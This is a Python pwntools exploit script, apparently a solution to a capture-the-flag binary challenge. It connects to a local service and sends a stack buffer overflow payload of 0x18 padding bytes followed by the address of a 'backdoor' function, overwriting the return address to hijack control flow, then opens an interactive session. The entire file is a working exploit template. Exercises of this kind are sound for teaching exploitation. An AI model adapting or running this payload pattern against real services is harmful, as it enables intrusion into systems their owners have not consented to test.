# coding=utf-8
from pwn import *
context.log_level='debug'
context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

# s=ssh(host=host,port=port,user='CTFMan',password='guest')
# io=s.run('/bin/bash')

#io=process('./prog')
io=remote('127.0.0.1',8001)

elf=ELF('./prog')

#libc_file=''

s=lambda x:io.send(x)
sa=lambda x,y:io.sendafter(x,y)
sl=lambda x:io.sendline(x)
sla=lambda x,y:io.sendlineafter(x,y)
r=lambda x:io.recv(x)
ru=lambda x:io.recvuntil(x)
debug=lambda:gdb.attach(io)	

backdoor=0x00000000004006ab

payload='a'*0x18+p64(backdoor)
sla('I\'ll only give you one chance.',payload)

io.interactive()
